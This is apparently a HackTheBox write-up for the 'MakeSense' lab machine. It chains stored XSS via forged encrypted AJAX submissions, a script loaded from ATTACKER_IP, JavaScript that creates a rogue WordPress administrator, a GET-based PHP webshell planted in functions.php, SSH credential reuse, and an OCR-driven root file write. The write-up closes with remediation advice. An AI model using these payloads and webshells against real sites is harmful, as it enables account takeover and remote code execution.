# HackTheBox — MakeSense

**Difficulty:** Medium
**OS:** Linux (Ubuntu 24.04)
**Target:** `10.129.178.251` / `makesense.htb`

Full compromise chain: stored XSS → admin account takeover → theme editor RCE → credential reuse → OCR service path/content-controlled file write → root.

---

## 1. Reconnaissance

```bash
nmap -sV -sC --reason --min-rate 5000 10.129.178.251
```

| Port | Service | Notes |
|------|---------|-------|
| 22   | SSH (OpenSSH 9.6p1) | |
| 80   | filtered | blocked externally |
| 443  | Apache 2.4.58 / WordPress | `makesense.htb` cert CN, site title "Agency LLC" |
| 8001 | filtered | later found to be `127.0.0.1:8001` only (OCR service) |

Added `makesense.htb` to `/etc/hosts` (vhost taken from the TLS certificate CN).

---

## 2. Web Enumeration

```bash
wpscan --url https://makesense.htb --enumerate u,vp,vt --disable-tls-checks
```

- Theme: **webagency** v1.0
- Users: `walter`, `admin`, `jake`
- REST API discovery (`/index.php?rest_route=/`) revealed custom post types: `case`, `team_member`, `contact_submission` — indicating a custom theme with bespoke functionality beyond a stock WordPress site.

Viewing the homepage source revealed a "Call WebAgency" feature: an in-browser voice-recording widget that transcribes audio **client-side** using Transformers.js (Whisper) and sends the result to the server via AJAX.

Key files:
- `wp-content/themes/webagency/assets/js/main.js`
- `wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js`

---

## 3. Vulnerability #1 — Client-Side "XSS Injection" Feature (Stored XSS)

Inside `whisper-wrapper.js`, a function named `applySymbolMapping()` explicitly maps spoken phrases to raw symbols:

```js
'open bracket': '<',
'close bracket': '>',
'quote': "'",
...
```

The code comment even states this mapping exists **"for XSS injection."** Since the transcription payload is encrypted client-side and sent directly to the server, an attacker doesn't need real audio — any JSON payload can be crafted and encrypted manually, bypassing the "spoken word" restriction entirely.

### Encryption scheme (reverse-engineered from JS)
- AES-256-GCM
- Key = `SHA256("bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI")`
- Payload = `base64(IV[12 bytes] + ciphertext + GCM tag[16 bytes])`

### Exploit flow
1. `POST admin-ajax.php` `action=save_voice_raw` → uploads dummy WAV → returns `post_id`
2. Encrypt `{"transcription": "<script src=...>", "summary": "..."}` with the key above
3. `POST admin-ajax.php` `action=save_voice_results` with `post_id` + `encrypted_payload`
4. Content saved to a `contact_submission` post, rendered **unescaped** in `wp-admin/edit.php?post_type=contact_submission` (confirmed via `wp-login.php`'s `redirect_to` parameter, which pointed to `edit.php?post_type=case` after login, confirming an admin routinely reviews this page)

### Payload used
```js
fetch('/wp-admin/user-new.php', {credentials: 'same-origin'})
  .then(r => r.text())
  .then(html => {
    const nonce = html.match(/name="_wpnonce_create-user" value="([a-f0-9]+)"/)[1];
    const body = new URLSearchParams();
    body.set('action', 'createuser');
    body.set('_wpnonce_create-user', nonce);
    body.set('user_login', 'pwned2');
    body.set('email', 'pwned2@evil.com');
    body.set('pass1', 'P@ssw0rd123!');
    body.set('pass2', 'P@ssw0rd123!');
    body.set('role', 'administrator');
    body.set('createuser', 'Add New User');
    return fetch('/wp-admin/user-new.php', {
      method: 'POST', credentials: 'same-origin',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body
    });
  });
```

An automated admin bot visits the "Cases"/submissions review page periodically. The injected `<script src="http://ATTACKER_IP:8080/x.js">` executed in that authenticated admin context, silently creating a new WordPress administrator (`pwned2`) via the logged-in session's cookies and nonce.

**Root cause:** stored XSS via unsanitized `_voice_transcription` / `_voice_summary` post meta, rendered raw with `nl2br($transcription)` instead of `esc_html()`.

---

## 4. Vulnerability #2 — Authenticated RCE via Theme File Editor

With admin access (`pwned2:P@ssw0rd123!`), WordPress's built-in **Theme File Editor** (`wp-admin/theme-editor.php`) allows direct PHP file editing for the active theme.

```bash
# fetch nonce from live editor page (name="nonce", not the usual _wpnonce)
# append a GET-based webshell to functions.php
```

```php
add_action('init', function() {
    if (isset($_GET['cmd'])) { system($_GET['cmd']); exit; }
});
```

Saved via POST to `theme-editor.php` (`action=update&file=functions.php&theme=webagency`) using the session cookie + fresh nonce.

```bash
curl -sk "https://makesense.htb/?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Root cause:** admin-level file editing is a first-class WordPress feature (`DISALLOW_FILE_EDIT` was not set), and account creation was never meant to be reachable by an unauthenticated visitor — the actual root cause is the stored XSS chain that got us an admin account in the first place.

---

## 5. Lateral Movement — Credential Reuse (www-data → walter)

```bash
curl -s "https://makesense.htb/?cmd=cat%20/var/www/html/wp-config.php"
```

```php
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
```

Password reused for the `walter` system/SSH account:

```bash
ssh walter@makesense.htb
# Password: JbhHDAEgXvri3!
```

```
cat user.txt
cf4379f7ade772d98b54db52b4ce60f2
```

**Root cause:** database credential reused verbatim as a system account password.

---

## 6. Privilege Escalation — OCR Service (walter → root)

`ps aux` on the box revealed:
```
root  1345  php -S 127.0.0.1:8001 -t /root/ocr4/
```

A PHP dev server bound to localhost only, running **as root**, serving a canvas-drawing OCR web app ("MakeSense" — draw text, Tesseract recognizes it, save the result to a file).

```bash
curl -si http://127.0.0.1:8001/
# HTTP/1.0 401 Unauthorized
# WWW-Authenticate: Basic realm="OCR Protected"
```

Same DB password reused a third time:
```bash
curl -s -u walter:JbhHDAEgXvri3! http://127.0.0.1:8001/   # -> 200 OK
```

### App flow
1. `POST /` with `canvas_image=data:image/png;base64,...` → runs Tesseract OCR → returns recognized text + an `ocr_id`
2. `POST /` with `ocr_id` + `filename` + `save_output=Save` → writes the recognized text to `saved/<basename(filename)>`

`filename` is sanitized to a basename (path traversal outside `saved/` is blocked), **but there is no extension filtering** — `.php` files are accepted and saved directly inside the web-servable `saved/` directory.

### Exploit
Since the "OCR input" is just whatever the recognizer reads from an image, and we don't need real handwriting, a synthetic image was generated with headless Chrome and fed straight to the recognizer:

```bash
# Rendered <?php system($_GET[0]); ?> as a PNG via headless Chrome
/opt/google/chrome/chrome --headless --disable-gpu --no-sandbox \
  --screenshot=/tmp/payload.png --window-size=700,250 /tmp/payload.html
```

```python
# Single session: OCR the image, then save as shell.php
s = requests.Session()
s.auth = ("walter", "JbhHDAEgXvri3!")
r1 = s.post(URL, data={"canvas_image": data_url})          # OCR
ocr_id = re.search(r'name="ocr_id" value="([^"]+)"', r1.text).group(1)
r2 = s.post(URL, data={"ocr_id": ocr_id, "filename": "shell.php", "save_output": "Save"})
```

```bash
curl -s -u walter:JbhHDAEgXvri3! "http://127.0.0.1:8001/saved/shell.php?0=id"
# uid=0(root) gid=0(root) groups=0(root)
```

Root RCE confirmed.

```bash
curl -s -u walter:JbhHDAEgXvri3! --data-urlencode "0=cat /root/root.txt" -G \
  "http://127.0.0.1:8001/saved/shell.php"
```

**Root cause:** arbitrary file write with attacker-controlled content (OCR output) and attacker-chosen filename/extension, inside a directory served by a PHP-executing web server running as root — a textbook unrestricted-file-upload-to-RCE, just routed through an OCR pipeline instead of a normal upload form.

---

## Full Attack Chain Summary

```
Recon (nmap, wpscan)
   │
   ▼
Stored XSS in voice-transcription feature (client-side encryption bypassed
by crafting the ciphertext directly, no real audio needed)
   │
   ▼
XSS fires in admin's browser → creates new WP administrator account
   │
   ▼
Admin access → Theme File Editor → webshell in functions.php
   │
   ▼
RCE as www-data → read wp-config.php → DB password
   │
   ▼
Password reuse → SSH as walter → user.txt
   │
   ▼
Root-owned localhost-only OCR service, same password reused again
   │
   ▼
OCR output = attacker-controlled file content, filename = attacker-controlled
→ write shell.php into web-servable directory → RCE as root → root.txt
```

## Key Takeaways / Remediation

1. **Never trust client-side "sanitization"** — the theme's `applySymbolMapping()` function was, by its own comment, designed to allow symbol injection; anything client-encrypted can be forged without the client at all if the key is embedded in shipped JS.
2. **Always output-encode user-controlled data** rendered in wp-admin (`esc_html()`, not raw `nl2br()`).
3. **Disable the Theme/Plugin File Editor** in production (`define('DISALLOW_FILE_EDIT', true);`).
4. **Never reuse passwords** across database accounts, system/SSH accounts, and internal service accounts — one password compromise here cascaded three times.
5. **Validate both filename *and* content-type/extension** on any file-write functionality, especially when the "content" originates from an ML pipeline (OCR/transcription) that a user can influence via crafted input images.
6. **Don't run internal/dev services as root**, even when bound to localhost — a localhost-only binding is not a security boundary against local users.
